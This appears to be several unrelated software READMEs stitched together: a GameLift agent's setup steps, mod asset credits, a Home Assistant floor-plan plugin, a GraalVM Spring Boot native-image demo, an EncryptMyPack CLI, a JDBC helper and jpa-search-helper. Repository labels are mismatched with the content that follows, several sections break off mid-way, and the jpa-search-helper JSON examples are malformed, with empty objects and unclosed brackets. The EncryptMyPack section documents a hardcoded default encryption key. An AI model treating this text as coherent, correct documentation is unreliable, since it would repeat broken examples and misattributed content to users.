#### Powershell
```
Copy-Item -Path .\target\GameLiftAgent-1.0.jar -Destination C:\game\
```

2. Then move the game executable to the same directory (/local/game).
#### Linux
```
cp [GAME_EXECUTABLE] /local/game
```

#### Powershell
```
Copy-Item -Path [GAME_EXECUTABLE] -Destination C:\game\
```

3. Grant read and execute permissions to run the JAR and the game executable.
#### Linux
```
sudo chmod 755 /local/game/GameLiftAgent-1.0.jar
sudo chmod 755 /local/game/[GAME_EXECUTABLE]
```

### Run the application/jar
Use the following instructions to run the application:
1. The standalone jar will be located in `./target/` and can be launched with a command such as the following
(There are some example launch commands listed at the end):
```
java -jar ./target/GameLiftAgent-1.0.jar <Command Line Options>
```

In detail, these are the following items that are from the above-mentioned sources:
* From [ArtOfTecharium](https://github.com/Ycarx/artoftecharium) (animations and textures were slightly modified, e.g. addon ports added, etc.)
  * Assembler Model
  * Foundry Model
  * Laser Arm Model
  * Powered Furnace Model
  * Energy Acceptor Model
  * Machine Extender Texture
  * Exosuit Model
  * Deep Drill Model
  * Ceiling Lights
  * Tech Door, Lever, Button
  * Machine Platings
  * Metal Beam
  * Charger Model (heavily modified)
* From [malcolmriley's unused-textures repo](https://github.com/malcolmriley/unused-textures)
  * Oil fluid textures (the dark gas texture)
  * The withered crop textures
  * Most of the crafting component textures

shmuelzon/home-assistant-floor-plan,master,"# Home Assistant Floor Plan Plugin for Sweet Home 3D

This project is a plugin for the [Sweet Home 3D](https://www.sweethome3d.com/)
interior design application.
It allows creating a 3D rendered floor plan panel for Home Assistant that
displays your home's current lighting state along with icons for toggling each
light, sensors and cameras.

<img src=""doc/demo.gif"" />

## Features

* **3D Rendered Floor Plan** - Integrates with Sweet Home 3D to automatically
  generate images of your floorplan (displays current lighting state, sensors,
  and other entities with interactive icons for toggling lights)
* **Rendering Modes** - Allow user to select the best rendering option to
  generate images from his Sweet Home 3D project
* **Complete Renders Mode** - Renders images for all possible light combinations
  and rooms
* **YAML Configuration** - Generate a YAML file with the picture-elements
  structure for easy integration with Home Assistant
* **Configuration Options** -
  * Group detected lights by room
  * Adjust output resolution
  * Select rendering engine (YafaRay / SunFlow)
  * Adjust output quality (high / low)
  * Progress bar indicates rendering status
  * Create state icons for multiple entities from Home Assistant based on their
    names
  * Lights are detected as stand-alone or within groups under SH3D
  * Caches previously rendered images to save time when generating the next
    floorplan

## Rendering Modes

This plugin supports 3 modes for rendering the different lights

### CSS

In this (recommended) mode a base image is generated with all the lights turned
off. Then, for each light source, a new image is rendered with only it turned
on. The floor plan YAML then instructs the browser how to mix the different
lights sources from each render when multiple light sources interact with each
other.

This method offers good results with a low number of required images to render.

### Room Overlay

The floor plan is comprised of one base/background image without any of the
lights turned on. Then, for each light, it generates an overlay image where only
changed pixels are included and the rest of the image is transparent. This
allows for overlaying multiple images, with multiple lights turned on together
without the need for different renders for all possible combinations.

In order to get the best results for lights that do interact with each other,
i.e., the lights that appear in the same room, will be rendered with all
possible combinations. This approach significantly reduces the number of
rendered images, compared to all possible combinations of the entire floor.

### Complete Renders

This mode renders separate images for all possible light combinations on the
rendered floor. It requires generating many renders but offers the best quality.

## How To Use The Plugin

1. Download the latest plugin from the [releases](../../releases/latest) page
   and install it
2. Prepare your model to fit with the [criteria](#preparation) of this plugin
3. Start the plugin by clicking the ""Tools""->""Home Assistant Floor Plan"" menu
4. Modify the [configuration options](#configuration-options) accordingly
5. Click ""Start""
6. Copy all images under `floorplan` folder to your Home Assistant path
7. Create a card of type `picture-elements` in Home Assistant and paste the
   contents of the generated `floorplan.yaml`

## Configuration Options

<img src=""doc/options.png"" />

The configuration window displays a list of detected lights grouped according to
the room they're located in. Please verify the list matches your expectations.

* Width / Height - Configure the required output resolution of the rendered
  images
* Light mixing mode - See [Rendering Modes](#rendering-modes)
* Sensitivity - [1, 100] The degree by which two pixels need to be different
  from one another to be taken into account for the generated overlay image.
  Only relevant for ""room overlay"" light mixing mode and RGB lights
* Renderer - Select which rendering engine to use, YafaRay or SunFlow
* Quality - Choose the rendering quality (low or high)
* Render time - The date and time of the rendered image, affects the sun
  position
* Image format - The image file format of the resulting floor plan (PNG or JPEG)
* Output directory - The location on your PC where the floor plan images and
  YAML will be saved

The progress bar at the bottom will indicate how many images need to be rendered
for the complete floor plan and will progress as they are ready.

You can also click on any entity from the list to reveal additional settings
that allow you to customize the entity according to your needs.

<img src=""doc/entityOptions.png"" />

* Display type - Configure how the entity is displayed on the floorplan, see
  [Elements](https://www.home-assistant.io/dashboards/picture-elements/#elements)
* Tap Action - Define what to do when the entity is tapped/clicked on, see
  [Tap Action](https://www.home-assistant.io/dashboards/actions/#tap-action)
* Always on - Only for lights, set light as always on removing its icon and it
  won't be affected by the matching Home Assistant state
* Is RGB(W) light - Only for lights, set light as an RGB light that will change
  its color in the floorplan according to the color set in Home Assistant. This
  requires installing the
  [config-template-card](https://github.com/iantrich/config-template-card)
  custom Lovelace card.

  :warning: **Note:** RGB lights are only supported in the CSS rendering mode.

## Preparation

* Set each light in SW3D with the entity name of Home Assistant, i.e.,
  `light.xxx`, `switch.xxx`
* Only light sources that are **visible** and have a **power > 0%** are
  considered
* If you have multiple light sources that are controlled by the same switch,
  e.g., spot lights, give them all the same name
* If you want to add a tool-tip to the state icon in Home Assistant, enter it
  in to the description field of the SH3D furniture
* If lights from two different rooms do interact with each other, e.g., there's
  a glass door separating the rooms, you can give both rooms the same name and
  they'll be treated as one
* To include state icons and labels for sensors, set the relevant furniture name
  to the entity name of Home Assistant, available entities for this plugin:
  * `binary_sensor.xxx`
  * `camera.xxx`
  * `climate.xxx`
  * `cover.xxx`
  * `fan.xxx`
  * `input_boolean.xxx`
  * `media_player.xxx`
  * `sensor.xxx`
  * `switch.xxx`
  * `vacuum.xxx`

## Suggestions

For best results, it's suggested to:
* Set the 3D view's time to 8:00 AM and disable ceiling lights

When using the ""Room overlay"" light mixing mode, it's also suggested to:
* Use a dark background for the 3D view
  * It can later be converted to transparent using an image editor
* Close all the doors between individually lighted rooms

## Frequently Asked Questions

* **Where should I copy the generated files and what should I copy?**
  After the process is complete, copy the floorplan folder and `floorplan.yaml`
  to your Home Assistant path, e.g., `/config/www`.

* **How do I select the desired perspective for rendering?**
  Before activating the plugin, set the SH3D project to the specific 3D point of
  view that you want to be rendered.

* **How do I change the rendering settings?**
  Prior to activating the plugin, go to ""Create photo..."" in the SH3D project
  and adjust the settings there. You do not need to render or save anything;
  simply make the changes and close the dialog.

* **Can I work on the SH3D project while rendering?**
  No, do not make any changes or interact with the 3D view while it‚Äôs rendering.
  These actions will be captured by the plugin as it scripts the renders one by
  one. Start the rendering process and then leave it to complete.

* **What's the difference between `renders` and `floorplan` folders?**
  The renders directory includes the rendered images as generated by SH3D. The
  floorplan directory includes the images you need to copy over to Home Assistant.
  With the CSS option, both directories are pretty much the same, except that the
  base image (with all the lights turned off) exists only in the floorplan
  directory. This is because in this mode, we let the browser to the light
  blending and this plugin doesn't need to do anything special.

  With the room overlay mode, the renders, again, includes all the images
  generated by SH3D while the floorplan directory will include the processed
  images with the transparent background.

  The renders directory was created (back when room overlay was the only option)
  in case one wanted to change any parameters (like the sensitivity) to generate a
  new floor plan without needing to wait for all the renders from SH3D, which
  don't change. It's basically a cache of rendered images.

* **What's the use of `Use existing renders` option?**
  Technically this option can work with any mode. You can start with the CSS
  mode and generate the least number of needed renders but then decide to switch
  to room overlay. When doing so, you already have part of the required renders
  and there's no need to generate them again. If you started with room overlay and
  switched to CSS, you'll have all of the required images and the whole process
  will be done in a few seconds

## Possible Future Enhancements

- [x] Allow using existing rendered images and just re-create overlays and YAML
- [ ] After rendering is complete, show preview of overlay images
- [ ] Allow overriding state-icons/labels positions, and save persistently
- [X] Allow defining, per entity, if it should be an icon or label, and save
      that persistently

yubb-ai/unofficial-gpt4,main,"# Spring Boot Native Image Microservice

This demo shows how to build, package, and run a simple Spring Boot 3 microservice from a JAR file with the GraalVM JDK,
and from a native executable with GraalVM Native Image. The benefits of using a native executable are faster start-up
times and reduced memory consumption. It also demonstrates how to run the application and build the native executable
within a Docker container.

There are two ways to generate a native executable from a Spring Boot application:

- [Using GraalVM Native Build Tools](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.native-build-tools)
- [Using Buildpacks](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks)

## Sample Application

The example is a minimal REST-based API application, built on top of Spring Boot 3. It consists of:

- `com.example.jibber.JibberApplication`: the main Spring Boot class. It is also a REST controller which serves as an
  entry-point for HTTP requests.
- `com.example.jibber.Jabberwocky`: a utility class that implements the logic of the application.

If you call the HTTP endpoint, `/jibber`, it will return some nonsense verse generated in the style of the Jabberwocky
poem, by Lewis Carroll. The program achieves this by using a Markov Chain to model the original poem (this is
essentially a statistical model). This model generates a new text. The example application provides the text of the
poem, then generates a model of the text, which the application then uses to generate a new text that is similar to the
original text. The application uses the [RiTa library](https://rednoise.org/rita/) as an external dependency to build
and use Markov Chains.

By default, the demo uses
the [Native Build Tools Maven plugin](https://graalvm.github.io/native-build-tools/latest/maven-plugin.html) to perform
the tasks. If you would like to run this demo
using [BuildPacks](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks),
the build configuration is provided for you too.

## Prerequisites

1. Download and install the latest GraalVM JDK using [SDKMAN!](https://sdkman.io/).
    ```bash
    sdk install java 21.0.2-graal
    ```

2. (Optional) Install and run a Docker-API compatible container runtime such
   as [Rancher Desktop](https://docs.rancherdesktop.io/getting-started/installation/), [Docker](https://www.docker.io/gettingstarted/),
   or [Podman](https://podman.io/docs/installation). If you are using Docker, configure it
   to [allow non-root user access](https://docs.docker.com/engine/install/linux-postinstall/#manage-docker-as-a-non-root-user)
   if you are on Linux.

3. Download the demos repository or clone it as follows:

    ```bash
    git clone https://github.com/graalvm/graalvm-demos
    ```

4. Change directory to the demo subdirectory:

    ```bash
    cd spring-native-image
    ```

## Application JAR

### Build and Run as a JAR

This demo is built using Maven.

1. Build the application on top of a JVM:

    ```shell
    ./mvnw clean package
    ```

   It generates a runnable JAR file that contains all of the application‚Äôs dependencies and also a correctly
   configured `MANIFEST` file.

2. Run the application JAR and put it into the background by appending `&`:

    ```shell
    java -jar ./target/benchmark-jibber-0.0.1-SNAPSHOT.jar &
    ```

3. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or call the endpoint
   using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   It should generate a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

4. Bring the application to the foreground using `fg`, and then enter `<CTRL-c>` to terminate the application.

### (Optional) Containerize the JAR

The following steps (5-8) show how you can easily containerize the JAR built in the previous step using the Oracle
GraalVM JDK container image `container-registry.oracle.com/graalvm/jdk:17-ol8`.

5. Run this command to package the JAR as a Docker container:

    ```shell
    docker build -f Dockerfiles/Dockerfile.jvm --build-arg APP_FILE=benchmark-jibber-0.0.1-SNAPSHOT.jar -t jibber-benchmark:jvm.0.0.1-SNAPSHOT .
    ```

6. Run the container:

    ```shell
    docker run --rm --name graal -p 8080:8080 jibber-benchmark:jvm.0.0.1-SNAPSHOT
    ```

7. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or from a new
   terminal window, call the endpoint using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   You should get a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

8. To stop the application, first get the container id using `docker ps`, and then run:

    ```shell
    docker rm -f <container_id>
    ```

## Native Executable

Recap what you have so far: built a Spring Boot application with an HTTP endpoint, and successfully containerised it.
Now you will look at how you can create a native executable from your application.

Spring Boot 3's built-in support for GraalVM Native Image makes it easy to compile a Spring Boot 3 application into a
native executable.

This native executable not only starts faster but also uses far fewer resources than running the application as a JAR
file.

You can use the `native-image` tool from the GraalVM installation to build a native executable.
In this example, you'll use
the [GraalVM Native Build Tools for Maven](https://graalvm.github.io/native-build-tools/latest/maven-plugin.html) to
build a native executable.

### Default Native Build Configuration

Make sure you‚Äôre using `spring-boot-starter-parent` in order to inherit the out-of-the-box `native` profile, and
the `org.graalvm.buildtools:native-maven-plugin` plugin.

You should see the following in the Maven `pom.xml` file:

``` xml
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>3.2.0</version>
    <relativePath/> <!-- lookup parent from repository -->
</parent>
```

``` xml
<build>
    <plugins>
        <plugin>
            <groupId>org.graalvm.buildtools</groupId>
            <artifactId>native-maven-plugin</artifactId>
        </plugin>
        ...
    </plugins>
</build>
```

The out-of-the-box `native` profile
has [GraalVM Reachability Metadata](https://www.graalvm.org/native-image/libraries-and-frameworks/) enabled by default.

### Build and Run as a Native Executable

With the out-of-the-box `native` profile active, you can invoke the `native:compile` goal to trigger native-image
compilation.

1. Run the following command:

    ```shell
    ./mvnw native:compile -Pnative
    ```

   The `native` profile is used to generate a native executable for your platform. The native executable is called
   _benchmark-jibber_ and is generated in the _target_ directory.

   > Alternatively, to build using BuildPacks, run the `./mvnw spring-boot:build-image -Pnative` command to generate a
   native executable. For more information about using BuildPacks to create a native executable,
   see [Building a Native Image Using Buildpacks](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks).

2. Run the native executable and put it into the background by appending `&`:

    ```shell
    ./target/benchmark-jibber &
    ```

3. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or call the endpoint
   using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   You should get a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

4. Bring the application to the foreground using `fg`, and then enter `<CTRL-c>` to terminate the application.

From the log output, notice how much quicker the native executable version of this Spring Boot application starts
compared to the JAR. The native executable also uses fewer resources than running from a JAR file.

### Additional Native Build Configuration

Notice that you can pass additional configuration arguments to the underlying `native-image` build tool using
the `<buildArgs>` section. In individual `buildArg` tags, you can pass parameters exactly the same way as you do from a
command line. This lets you use all of the parameters that work with the `native-image` tool from Maven.

Add the following snippet to the pom.xml to pass additional arguments to enable verbose output, quick build mode, etc.
over and above the out-of-the-box `native` profile.

```xml
<profiles>
   <profile>
      <id>native</id>
      <build>
         <plugins>
            <plugin>
               <groupId>org.graalvm.buildtools</groupId>
               <artifactId>native-maven-plugin</artifactId>
               <!--<version>0.9.28</version>-->
               <configuration>
                  <verbose>true</verbose>
                  <quickBuild>true</quickBuild>
                  <buildArgs combine.children=""append"">
                     <arg>-H:+ReportExceptionStackTraces</arg>
                  </buildArgs>
               </configuration>
            </plugin>
         </plugins>
      </build>
   </profile>
</profiles>
```

### Build and Run as a Native Executable

Let's rebuild the native executable with the additional configuration arguments.

1. Run the following command:

    ```shell
    ./mvnw native:compile -Pnative
    ```

   With the quick build mode enabled, it takes less time to build the native executable. This mode should be used in
   development for faster builds.

2. Run the native executable and put it into the background by appending `&`:

    ```shell
    ./target/benchmark-jibber &
    ```

3. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or call the endpoint
   using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   You should get a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

4. Bring the application to the foreground using `fg`, and then enter `<CTRL-c>` to terminate the application.

From the log output, notice how much quicker the native executable version of this Spring Boot application starts
compared to the JAR. The native executable also uses fewer resources than running from a JAR file.

### (Optional) Containerize the Native Executable on Linux

The following steps (5-8) are for Linux only.

5. On Linux, you can easily containerise the native executable using the following command:

    ```shell
    docker build -f Dockerfiles/Dockerfile.native --build-arg APP_FILE=benchmark-jibber -t jibber-benchmark:native.0.0.1-SNAPSHOT .
    ```

6. Run the application:

    ```shell
    docker run --rm --name native -p 8080:8080 jibber-benchmark:native.0.0.1-SNAPSHOT
    ```

7. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or from a new
   terminal window, call the endpoint using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   It should generate a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

8. To stop the application, first get the container id using `docker ps`, and then run:

    ```shell
    docker rm -f <container_id>
    ```

### (Optional) Use Multistage Docker Builds to Build a Native Image and Package it in a Lightweight Container

The following steps (9-12) are for all platforms - MacOS, Windows, and Linux.

For MacOS and Windows, to build a Docker image containing your native executable, you need to build the native
executable inside a Docker container. To do this, we've provided
a [multistage Docker build file](./Dockerfiles/Dockerfile).

9. Run this command to build the native executable within a Docker container:

    ```shell
    docker build -f Dockerfiles/Dockerfile -t jibber-benchmark:native.0.0.1-SNAPSHOT .
    ```

10. Run the application:

    ```shell
    docker run --rm --name native -p 8080:8080 jibber-benchmark:native.0.0.1-SNAPSHOT
    ```

11. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or from a new
    terminal window, call the endpoint using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

    It should generate a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

12. To stop the application, first get the container id using `docker ps`, and then run:

    ```shell
    docker rm -f <container_id>
    ```

## Measure the Performance of the Application and Metrics

The Spring Actuator dependency has been added to the project, along with support for Prometheus. If you want to test the
performance of either the JVM version, or the native executable version of the application, you can make use of the
Prometheus support. If you are hosting the application locally, it is available on port 8080:

[http://localhost:8080/actuator/prometheus](http://localhost:8080/actuator/prometheus)

![version](https://img.shields.io/badge/Version-1.0.0-green.svg)

A command line util for encrypting and decrypting resource packs.

## Feature
 - Encrypt and decrypt resource packs
 - Support resource pack that contains sub packs

## Usage

Download the latest executable file from [release](https://github.com/AllayMC/EncryptMyPack/releases/latest)

### Encryption

Command: `EncryptMyPack.exe encrypt <inputZip> <outputZip> [key]`

1. The key should be a 32 character long string. If you don't provide a key, the key will be `liulihaocai123456789123456789123`

2. Make sure your pack is a zip file, and in your pack should be a manifest.json

After the encryption, a `contents.json` should now be in output zip file, and the key will be displayed in the console

### Decryption

Command: `EncryptMyPack.exe decrypt <inputZip> <outputZip> <key>`

1. Again, the key should be a 32 character long string.
2. To decrypt the pack, you must provide its key

## Build

This project use graalvm native image to transform the jar to a native executable

So you should set up graalvm and set project JDK to graalvm before building

## Dependency Information

### Maven

```xml
<dependency>
    <groupId>dev.mccue</groupId>
    <artifactId>jdbc</artifactId>
    <version>2024.12.20</version>
</dependency>
```


### Gradle

```groovy
dependencies {
    implementation(""dev.mccue:jdbc:2024.12.20"")
}
```


## Usage

These examples use [sqlite](https://central.sonatype.com/artifact/org.xerial/sqlite-jdbc). 

<!--

### Select rows by id

Any variables injected into the template will be replaced with `?`s in the
SQL and will be set with `.setObject` on the returned `PreparedStatement`.

```java
import dev.mccue.jdbc.StatementPreparer;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    var id = 1;
    try (var conn = db.getConnection()) {
        try (var stmt = StatementPreparer.of(conn).""""""
                SELECT *
                FROM widget
                WHERE id = \{id}
                """""") {
            var rs = stmt.executeQuery();
        }
    }
}
```

### Select rows by ids

List parameters are automatically expanded into `(?, ?, ?)` with
one question mark for each element in the list.

```java
import dev.mccue.jdbc.StatementPreparer;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    var ids = List.of(1, 2, 3);
    try (var conn = db.getConnection()) {
        try (var stmt = StatementPreparer.of(conn).""""""
                SELECT *
                FROM widget
                WHERE id IN \{ids}
                """""") {
            var rs = stmt.executeQuery();
        }
    }
}
```

### Inject parameters with custom logic

To inject a parameter that needs to be set with something other than `setObject`,
you can make an instance of `SettableParameter`.

```java
import dev.mccue.jdbc.SettableParameter;
import dev.mccue.jdbc.StatementPreparer;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    var name = ""bob"";
    try (var conn = db.getConnection()) {
        try (var stmt = StatementPreparer.of(conn).""""""
                SELECT *
                FROM widget
                WHERE name = \{SettableParameter.ofNString(name)}
                """"""){
            var rs = stmt.executeQuery();
        }
    }
}
```
-->

### Read nullable primitive types

`ResultSets` includes helpers for reading potentially null
primitive types from a `ResultSet`

```java
import dev.mccue.jdbc.ResultSets;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();

            // Methods exist for all primitives except char 
            // (which doesn't have a method on ResultSet)
            var number = ResultSets.getIntegerNullable(rs, ""number"");
        }
    }
}
```

### Read non-null primitive types

If you want to read a column that is primitive, but you assume
is not null, there are helpers which will throw a `SQLException`
early if that assumption is violated.

```java
import dev.mccue.jdbc.ResultSets;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();

            // Methods exist for all primitives except char 
            // (which doesn't have a method on ResultSet)
            var number = ResultSets.getIntegerNotNull(rs, ""number"");
        }
    }
}
```

### Read a row as a `Record`

Often when going through a `ResultSet` you will want to materialize a whole row.

```java
import dev.mccue.jdbc.ResultSets;

public record Widget(int number) {}

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();
            var widget = ResultSets.getRecord(rs, Widget.class);

            System.out.println(widget);
        }
    }
}
```


### Read a row as a `Record` with customized mappings

If the name of a record component doesn't line up with what you want pulled from a
`ResultSet`, you can use the `@Column` annotation.

```java
import dev.mccue.jdbc.Column;
import dev.mccue.jdbc.ResultSets;

public record Widget(@Column(label = ""number"") int n) {
}

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();
            var widget = ResultSets.getRecord(rs, Widget.class);

            System.out.println(widget);
        }
    }
}
```

<!--
### Read a row as a `Record`, customizing how a column is gotten from a `ResultSet`.

```java
import dev.mccue.jdbc.Column;
import dev.mccue.jdbc.DefaultRecordComponentGetter;
import dev.mccue.jdbc.ResultSets;

import java.lang.reflect.RecordComponent;
import java.sql.ResultSet;
import java.sql.SQLException;

public record Text(String contents) {}

public static final class CustomRecordComponentGetter 
        extends DefaultRecordComponentGetter {
    @Override
    protected Object getIndexedRecordComponent(
            ResultSet rs, 
            RecordComponent recordComponent, 
            int index
    ) throws SQLException {
        return new Text(rs.getString(index));
    }

    @Override
    protected Object getLabeledRecordComponent(
            ResultSet rs, 
            RecordComponent recordComponent, 
            String label
    ) throws SQLException {
        return new Text(rs.getString(label));
    }
}

public record Widget(
        @Column(label = ""number"") 
        int n,
        @Column(
                recordComponentGetter = CustomRecordComponentGetter.class
        )
        Text name) {
}

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number, name
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();
            var widget = ResultSets.getRecord(rs, Widget.class);

            System.out.println(widget);
        }
    }
}

# JPA Search Helper

Library for building and running advanced and dynamic queries using JPA in Spring Boot.

## TL;DR
### Key features
- **Queries**: the library supports two modes for building advanced and dynamic queries:
  -  *Mode 1*: Via `Map<String, String>`, to support GET endpoints with query params.
  -  *Mode 2*: Via an [object](https://github.com/biagioT/jpa-search-helper/blob/main/src/main/java/app/tozzi/model/input/JPASearchInput.java), to support POST endpoints that expect query parameters in the body (from *2.0.0* version)
- **Projection**:  for both modes, the library allows you to extract only a subselection of fields from the query (from *3.2.0* version)

### Spoiler
Through **jpa-search-helper** your controller* will be able to receive requests like this:

*Mode 1*:
```bash  
curl -X GET \
  'https://myexampledomain.com/persons?
  firstName=Biagio
  &lastName_startsWith=Toz
  &birthDate_gte=19910101
  &country_in=IT,FR,DE
  &address_eq=Via Roma 1,Via Milano/,1,20 West/,34th Street
  &company.name_in=Microsoft,Apple,Google
  &company.employees_between=500,5000'
```  

*Mode 2*:
```bash  
curl -X POST -H ""Content-type: application/json"" -d '{
  ""filter"" : {
      ""operator"": ""and"", // the first filter must contain a root operator: AND, OR or NOT
      ""filters"" : [
        {
          ""operator"": ""eq"",
          ""key"": ""firstName"",
          ""value"": ""Biagio""
        },
        {
          ""operator"": ""or"",

        },
        {
          ""operator"": ""or"",
          ""filters"": [
            {

            },
            {
              ""operator"": ""lte"",
              ""key"": ""birthDate"",
              ""value"": ""20010101""
            }
          ]
        },
        {

    ""pageOffset"": 0,
    ""sortKey"": ""birthDate"",
    ""sortDesc"": false
  }

## Queries - Usage
### 1. `@Searchable` annotation
Start by applying the `@Searchable` annotation to the fields in your Domain Model, or alternatively your JPA entity, **that you want to make available for search**.
If you have fields that you want to make searchable within other objects then annotate these with `@NestedSearchable`.

```java
@Data
public class Person {

  @Searchable
  private String firstName;

  @Searchable
  private String lastName;

  @Searchable(entityFieldKey = ""dateOfBirth"")
  private Date birthDate;

  @Searchable
  private String country;
  
  @Searchable
  private String fillerOne;
  
  @Searchable
  private String fillerTwo;

  @NestedSearchable
  private Company company;

  @Data
  public static class Company {

    @Searchable(entityFieldKey= ""companyEntity.name"")
    private String name;

    @Searchable(entityFieldKey= ""companyEntity.employeesCount"")
    private int employees;
  }
}
```
The annotation allows you to specify:

- Core properties:

  - `entityFieldKey`:
    the name of the field defined on the entity bean (not to be specified if using the annotation on the entity bean). If not specified the key will be the field name.
  - `targetType`: the managed object type by entity. If not specified the librariy tries to obtain it based on field type (es. Integer field without target type definition will be `INTEGER`). If there is no type compatible with those managed, it will be managed as a string. Managed types:

    - `STRING`, `INTEGER`, `DOUBLE`, `FLOAT`, `LONG`, `BIGDECIMAL`, `BOOLEAN`, `DATE`, `LOCALDATE`, `LOCALDATETIME`, `LOCALTIME`, `OFFSETDATETIME`, `OFFSETTIME`, `ZONEDDATETIME`.

- Validation properties:

  - `datePattern`: only for `DATE`, `LOCALDATE`, `LOCALDATETIME`, `LOCALTIME`, `OFFSETDATETIME`, `OFFSETTIME`, `ZONEDDATETIME` target types. Defines the date pattern to use.
  - `maxSize, minSize`: maximum/minimum length of the value.
  - `maxDigits, minDigits`: only for numeric types. Maximum/minimum number of digits.
  - `regexPattern`: regex pattern.
  - `decimalFormat`: only for decimal numeric types. Default `#.##`

- Other:
  - `sortable`: if false, the field can be used by search but cannot be used for sorting. Default: true.
  - `trim`: apply trim.
  - `tags`: useful if the Domain Model field can correspond to multiple entity fields (the example is available further down).
  - `allowedFilters`: exclusively allowed filters.
  - `notAllowedFilters`: not allowed filters.
  - `likeFilters`: allowed like filters (_contains_, _startsWith_, _endsWith_). Default: true.

Continuing the example, our entity classes:

```java
@Entity
@Data
public class PersonEntity {

  @Id
  private Long id;

  @Column(name = ""FIRST_NAME"")
  private String firstName;

  @Column(name = ""LAST_NAME"")
  private String lastName;

  @Column(name = ""BIRTH_DATE"")
  private Date dateOfBirth;

  @Column(name = ""COUNTRY"")
  private String country;

  @Column(name = ""FIL_ONE"")
  private String fillerOne;

  @Column(name = ""FIL_TWO"")
  private String fillerTwo;

  @OneToOne
  private CompanyEntity companyEntity;

}

@Entity
@Data
public class CompanyEntity {

  @Id
  private Long id;

  @Column(name = ""NAME"")
  private String name;

  @Column(name = ""COUNT"")
  private Integer employeesCount;

}
```

### 2. `JPASearchRepository` interface
Your Spring JPA repository must extend `JPASearchRepository<YourEntityClass>`.

```java
@Repository
public interface PersonRepository extends JpaRepository<PersonEntity, Long>, JPASearchRepository<PersonEntity> {

}
```

### 3. Search implementation
In your manager, or in your service, or wherever you want to use the repository:

**Mode 1**: define a map _<filter_key#options, value>_:
```java
// ...

  @Autowired
  private PersonRepository personRepository;

  public List<Person> advancedSearch() {
  
	// Pure example, in real use case it is expected that these filters can be passed directly by the controller
    Map<String, String> filters = new HashMap<>();
    filters.put(""firstName_eq"", ""Biagio"");
    filters.put(""lastName_startsWith#i"", ""Toz""); // ignore case
    filters.put(""birthDate_gte"", ""19910101""); 
    filters.put(""country_in"", ""IT,FR,DE"");
    filters.put(""company.name_eq#n"", ""Bad Company""); // negation
    filters.put(""company.employees_between"", ""500,5000"");
    filters.put(""fillerOne_null#n"", ""true""); // not null
    filters.put(""fillerTwo_empty"", ""true""); // empty
    
    // Without pagination
    List<PersonEntity> fullSearch = personRepository.findAll(filters, Person.class);
  
    filters.put(""birthDate_sort"" : ""ASC""); // sorting key and sorting order
    filters.put(""_limit"", ""10""); // page size
    filters.put(""_offset"", ""0""); // page offset
    
    // With pagination
    Page<PersonEntity> sortedAndPaginatedSearch = personRepository.findAllWithPaginationAndSorting(filters, Person.class);
    
    // ...
  }

// ...
```

**Mode 2**: instead of a map, you will need to use [`JPASearchInput`](https://github.com/biagioT/jpa-search-helper/blob/main/src/main/java/app/tozzi/model/input/JPASearchInput.java), shown here, for simplicity, in JSON format.

```json
{
  ""filter"" : {
      ""operator"": ""and"", // the first filter must contain a root operator: AND, OR or NOT
      ""filters"" : [
        {
          ""operator"": ""eq"",
          ""key"": ""firstName"",
          ""value"": ""Biagio""
        },
        {
          ""operator"": ""or"",
          ""filters"": [
            {
              ""operator"": ""startsWith"",
              ""key"": ""lastName"",
              ""value"": ""Toz"",
              ""options"": {
                ""ignoreCase"": true
              }
            },
            {
              ""operator"": ""endsWith"",
